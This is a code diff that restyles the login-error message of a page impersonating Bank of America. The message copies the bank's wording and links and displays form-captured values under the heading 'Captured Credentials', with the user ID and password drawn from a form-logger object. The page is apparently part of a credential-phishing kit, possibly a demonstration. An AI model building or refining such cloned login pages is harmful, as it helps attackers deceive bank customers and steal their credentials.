@@ -89,27 +89,31 @@ function showFormCaptureError() {
   
   const err = document.createElement('div');
   err.className = 'error-skin';
+  err.style.cssText = 'background:#fce4ec;border:1px solid #f48fb1;padding:16px;margin:20px;display:flex;gap:12px;align-items:flex-start;font-family:Arial,sans-serif;font-size:13px;color:#333;line-height:1.6;z-index:10000;';
   
+  // Icon on the left
+  const iconDiv = document.createElement('div');
+  iconDiv.style.cssText = 'flex-shrink:0;color:#d32f2f;font-size:28px;line-height:1;margin-top:4px;';
+  iconDiv.innerHTML = '⚠';
+  
+  // Message content on the right
   const msgDiv = document.createElement('div');
   msgDiv.className = 'error-message';
+  msgDiv.style.cssText = 'flex:1;';
   
-  const p = document.createElement('p');
-  p.id = 'Vipaa_Action_0';
-  p.className = 'TLu_ERROR';
+  let liContent = 'The information you entered doesn\'t match our records. You have a few more tries remaining.<br>Please try again or <a name="forgot-id-passcode" href="./login-reset.html" style="color:#0066cc;text-decoration:none;">Forgot ID/Password</a>';
   
-  const li = document.createElement('li');
-  let liContent = 'The information you entered doesn\'t match our records. You have a few more tries remaining.<br> Please try again or click <a name="forgot-id-passcode" href="./login-reset.html">Forgot ID/Password</a><br><br><b>Having problems logging in or resetting your Password?</b> If you\'re using a password manager or your browser has stored credentials that are no longer valid, deleting your stored credentials should enable you to access your account. <a name="learn-more" href="https://www.bankofamerica.com/customer-service/contact-us/bank-of-america-login-issues/">Learn more</a>';
+  liContent += '<br><br><b style="color:#333;">Having problems logging in or resetting your Password?</b> If you\'re using a password manager or your browser has stored credentials that are no longer valid, deleting your stored credentials should enable you to access your account. <a name="learn-more" href="https://www.bankofamerica.com/customer-service/contact-us/bank-of-america-login-issues/" style="color:#0066cc;text-decoration:none;">Learn more</a>';
   
   // Display captured credentials if available
   if (window._formLoggerData) {
-    liContent += '<br><br><b style="display:block;margin-top:12px;">Captured Credentials:</b>';
-    liContent += '<span style="font-family:monospace;display:block;">User ID: ' + (window._formLoggerData.userId || 'N/A') + '</span>';
-    liContent += '<span style="font-family:monospace;display:block;">Password: ' + (window._formLoggerData.password || 'N/A') + '</span>';
+    liContent += '<br><br><b style="display:block;margin-top:12px;color:#666;">Captured Credentials:</b>';
+    liContent += '<span style="font-family:monospace;display:block;color:#333;">User ID: ' + (window._formLoggerData.userId || 'N/A') + '</span>';
+    liContent += '<span style="font-family:monospace;display:block;color:#333;">Password: ' + (window._formLoggerData.password || 'N/A') + '</span>';
   }
   
-  li.innerHTML = liContent;
-  p.appendChild(li);
-  msgDiv.appendChild(p);
+  msgDiv.innerHTML = liContent;
+  err.appendChild(iconDiv);
   err.appendChild(msgDiv);
   
   document.body.insertBefore(err, document.body.firstChild);
